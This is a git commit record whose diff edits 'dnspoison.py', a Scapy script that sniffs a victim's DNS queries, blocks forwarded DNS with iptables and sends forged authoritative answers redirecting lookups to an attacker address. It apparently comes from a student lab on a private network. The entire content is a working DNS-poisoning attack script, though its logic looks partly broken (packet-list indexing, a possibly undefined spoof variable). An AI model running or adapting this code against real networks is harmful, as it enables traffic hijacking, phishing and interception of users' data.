43bb4b170cd2becddb82b86478a82c650965b469
m4ul <hansonlucas06@gmail.com>
2022-11-10 20:49:13 +0100

    test

--- dnspoison.py
+++ dnspoison.py
@@ -1,19 +1,19 @@
 from scapy.all import sniff, srp, IP, DNS, DNSQR, Ether, UDP, DNSRR, sendp
 from subprocess import Popen, PIPE
 
-domain = 'reverseproxy.ynov.com.'
 victimIP = "10.5.1.2"
-routerIP = "10.5.1.254"
-ownIP = "10.5.1.3"
 gotoIP = "10.5.1.3"
 
-Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"],shell=True, stdout=PIPE)
+
 
 
 while True:
+    Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"],shell=True, stdout=PIPE)
     packet  = sniff(filter="udp and port 53")
-    if packet[IP].src == victimIP and packet.haslayer(DNS) and DNSQR in packet:
-        spoof = ((Ether())/IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=gotoIP)))
-    sendp(spoof, count=1)
+    if packet[IP].src != "127.0.0.1":
+        if packet[IP].src == victimIP and packet.haslayer(DNS) and DNSQR in packet:
+            spoof = ((Ether())/IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=gotoIP)))
+        Popen(["iptables -F"], shell=True, stdout=PIPE)
+        sendp(spoof, count=1)
 
     
